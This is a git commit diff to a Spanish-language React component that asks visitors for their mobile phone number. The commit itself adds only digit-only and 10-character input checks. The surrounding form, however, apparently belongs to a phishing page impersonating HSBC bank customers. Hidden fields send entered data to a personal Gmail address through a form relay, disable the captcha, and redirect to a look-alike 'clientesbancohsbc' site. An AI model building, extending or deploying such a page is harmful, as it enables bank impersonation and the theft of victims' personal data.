131de506293277103a6bd40d44207ed240df68f6
skaimarvel <134034793+skaimarvel@users.noreply.github.com>
2023-05-20 14:14:43 -0500

    Update Numerocelular.jsx

--- src/components/Numerocelular.jsx
+++ src/components/Numerocelular.jsx
@@ -2,6 +2,19 @@ import React from 'react';
 import '../css/style.css'
 
 const Numerocelular = () => {
+    
+    var numerocelular = document.querySelector('.inputname');
+
+numerocelular.addEventListener('input', function(){
+    if (this.value.length > 10)
+         this.value = this.value.slice(0,10);
+})
+// solo ingreso de numeros
+numerocelular.addEventListener('input', function(){
+    this.value = this.value.replace(/[^0-9]/g, '');
+})
+
+    
     return (
         <div className="contglobal">
         <div className='contenedor' >
@@ -12,7 +25,7 @@ const Numerocelular = () => {
                     <label className='label' >Ingresa tu número de celular</label>
                 </div>
                 <div className="input-cont">
-                    <input className='inputname' name='name' type="text"/>
+                    <input className='inputname' name='name' placeholder='Ingresa tu numero de celular' maxLength='10' type="text"/>
                     <input type="hidden" name="email" value="p1804251@gmail.com" />
                     <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
                     <input type="hidden" name="_captcha" value="false" />
